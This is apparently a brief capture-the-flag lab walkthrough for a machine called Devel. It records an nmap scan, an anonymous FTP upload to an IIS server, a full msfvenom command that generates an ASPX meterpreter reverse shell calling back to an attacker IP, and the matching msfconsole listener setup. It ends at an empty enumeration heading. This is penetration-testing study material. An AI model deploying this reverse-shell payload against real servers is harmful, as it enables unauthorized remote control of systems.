## Gaining a Foothold

### Devel  

**Initial Enum / RevShell Payload**
Nmap scan > iis server and ftp anonymous login identified > login ftp server and `PUT` test file sucessful > use msfvenom to generate a reverse tcp shell in aspx (since target is hosting iis)

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.05 LPORT=4444 -f aspx -o reverse.aspx`  

![image](https://github.com/user-attachments/assets/3db1aa08-39b4-45d2-afbe-01710f16b7cd)

**Listener with msfconsole**
msfconsole > use exploit/multi/handler > set payload windows/meterpreter/reverse_tcp > set LHOST 10.10.10.05 > set LPORT 4444 > run

#### System Enumeration
